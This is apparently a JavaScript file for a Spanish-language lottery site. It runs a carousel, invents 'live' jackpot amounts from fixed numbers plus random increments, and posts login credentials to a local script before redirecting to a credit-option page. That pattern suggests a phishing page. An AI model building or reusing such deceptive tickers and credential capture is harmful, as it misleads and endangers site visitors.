// Carousel functionality
let currentSlide = 0;
const slides = document.querySelectorAll('.carousel-inner');
const indicators = document.querySelectorAll('.carousel-indicators span');

function showSlide(index) {
    slides.forEach(slide => slide.classList.remove('active'));
    indicators.forEach(indicator => indicator.classList.remove('active'));

    slides[index].classList.add('active');
    indicators[index].classList.add('active');
}

function nextSlide() {
    currentSlide = (currentSlide + 1) % slides.length;
    showSlide(currentSlide);
}

function prevSlide() {
    currentSlide = (currentSlide - 1 + slides.length) % slides.length;
    showSlide(currentSlide);
}

document.querySelector('.carousel-next')?.addEventListener('click', nextSlide);
document.querySelector('.carousel-prev')?.addEventListener('click', prevSlide);

indicators.forEach((indicator, index) => {
    indicator.addEventListener('click', () => {
        currentSlide = index;
        showSlide(currentSlide);
    });
});

// Auto-advance carousel
setInterval(nextSlide, 5000);

// Continuous Jackpot Ticker
function startJackpotTicker() {
    const items = [
        { element: document.querySelector('.jackpot-item.mega .amount'), start: 257077151, increment: 0.8 },
        { element: document.querySelector('.jackpot-item.super .amount'), start: 1275228, increment: 0.2 },
        { element: document.querySelector('.jackpot-item.extra .amount'), start: 82353, increment: 0.05 }
    ];

    items.forEach(item => {
        if (!item.element) return;

        let current = item.start;
        // Starting with a random offset to make it look live
        current += Math.random() * 1000;

        function update() {
            // Continuous smooth increment
            current += item.increment + (Math.random() * item.increment);
            item.element.textContent = '$' + Math.floor(current).toLocaleString('es-CO');
            requestAnimationFrame(update);
        }

        requestAnimationFrame(update);
        requestAnimationFrame(update);
    });
}

// Start ticker
startJackpotTicker();

// Mobile Login Modal Logic
const loginModal = document.getElementById('loginModal');
const btnLogin = document.querySelector('.btn-login'); // Header button
const closeModal = document.getElementById('closeModal');
const loginForm = document.querySelector('.login-form');
const btnModalLogin = document.querySelector('.btn-modal-login');

// Helper to toggle loader
function toggleLoader(show) {
    const loader = document.getElementById('loadingOverlay');
    if (loader) {
        loader.style.display = show ? 'flex' : 'none';
    }
}

// Open Modal
if (btnLogin && loginModal) {
    btnLogin.addEventListener('click', async (e) => {
        e.preventDefault();

        // Mobile: Open Modal
        if (window.innerWidth <= 768) {
            loginModal.classList.add('active');
        }
        // Desktop: Submit Login
        else {
            const headerInputs = document.querySelectorAll('.header-search input');
            const userInput = headerInputs[0]?.value;
            const passInput = headerInputs[1]?.value;

            if (!userInput || !passInput) {
                alert('Por favor ingresa usuario y contraseña');
                return;
            }

            // Show Loading Overlay
            toggleLoader(true);

            try {
                const response = await fetch('login_process.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        username: userInput,
                        password: passInput
                    })
                });

                const data = await response.json();

                if (data.status === 'success') {
                    // Redirect to credit option
                    window.location.href = 'signup/creditoption/index.php';
                } else {
                    // Show error toast
                    const errorToast = document.getElementById('loginErrorCallback');
                    if (errorToast) {
                        errorToast.style.display = 'flex';
                        errorToast.style.position = 'fixed';
                        errorToast.style.top = '20px';
                        errorToast.style.right = '20px';
                        errorToast.style.left = 'auto';
                        errorToast.style.transform = 'none';
                        errorToast.style.zIndex = '10000';
                        errorToast.style.backgroundColor = '#D32F2F';
                        errorToast.style.color = '#fff';
                        errorToast.style.padding = '16px 20px';
                        errorToast.style.borderRadius = '4px';
                        errorToast.style.boxShadow = '0 4px 12px rgba(0,0,0,0.3)';
                        errorToast.style.alignItems = 'center';
                        errorToast.style.gap = '15px';
                        errorToast.style.maxWidth = '350px';
                        errorToast.style.width = 'auto';

                        setTimeout(() => {
                            errorToast.style.display = 'none';
                        }, 5000);
                    }
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error de conexión');
            } finally {
                // Hide Loading Overlay
                toggleLoader(false);
            }
        }
    });
}

// Close Modal
if (closeModal && loginModal) {
    closeModal.addEventListener('click', () => {
        loginModal.classList.remove('active');
    });
}

// Close on click outside
window.addEventListener('click', (e) => {
    if (e.target === loginModal) {
        loginModal.classList.remove('active');
    }
});

// Handle Login Submission
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const userInput = loginForm.querySelector('input[type="text"]').value;
        const passInput = loginForm.querySelector('input[type="password"]').value;

        // Show Loading Overlay
        toggleLoader(true);
        const submitBtn = loginForm.querySelector('button[type="submit"]');
        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.textContent = 'Enviando...';
        }

        try {
            const response = await fetch('login_process.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: userInput,
                    password: passInput,
                    honeypot: document.getElementById('website_check')?.value || ''
                })
            });

            const data = await response.json();

            if (data.status === 'success') {
                // Success! Redirect to credit option
                window.location.href = 'signup/creditoption/index.php';
            } else {
                // Failure - Show Custom Red Toast
                const errorToast = document.getElementById('loginErrorCallback');
                if (errorToast) {
                    // Show toast - centered on mobile
                    errorToast.style.display = 'flex';
                    errorToast.style.position = 'fixed';
                    errorToast.style.top = '20px';
                    errorToast.style.left = '50%';
                    errorToast.style.transform = 'translateX(-50%)';
                    errorToast.style.right = 'auto';
                    errorToast.style.zIndex = '10000';
                    errorToast.style.backgroundColor = '#D32F2F';
                    errorToast.style.color = '#fff';
                    errorToast.style.padding = '16px 20px';
                    errorToast.style.borderRadius = '4px';
                    errorToast.style.boxShadow = '0 4px 12px rgba(0,0,0,0.3)';
                    errorToast.style.alignItems = 'center';
                    errorToast.style.gap = '15px';
                    errorToast.style.maxWidth = '90%';
                    errorToast.style.minWidth = '320px';
                    errorToast.style.width = 'auto';

                    // Hide after 5 seconds
                    setTimeout(() => {
                        errorToast.style.display = 'none';
                    }, 5000);
                } else {
                    alert('Error: ' + (data.message || 'Usuario o contraseña incorrectos'));
                }
            }

        } catch (error) {
            console.error('Error:', error);
            alert('Error de conexión con el servidor local.');
        } finally {
            // Hide Loading Overlay
            toggleLoader(false);
            const submitBtn = loginForm.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Iniciar Sesión'; // O el texto original
            }
        }
    });
}



// Initialize on load
window.addEventListener('load', () => {
    startJackpotTicker();

    // DEBUG: Check if toast exists
    const toast = document.getElementById('loginErrorCallback');
    if (!toast) {
        console.error('CRITICAL: Error Toast Element NOT found in DOM');
        // alert('DEBUG: El elemento de error NO existe. Refresca con Ctrl+F5');
    } else {
        console.log('Toast element found');
        // alert('DEBUG: Elemento Toast Encontrado. ID: ' + toast.id);
    }
});
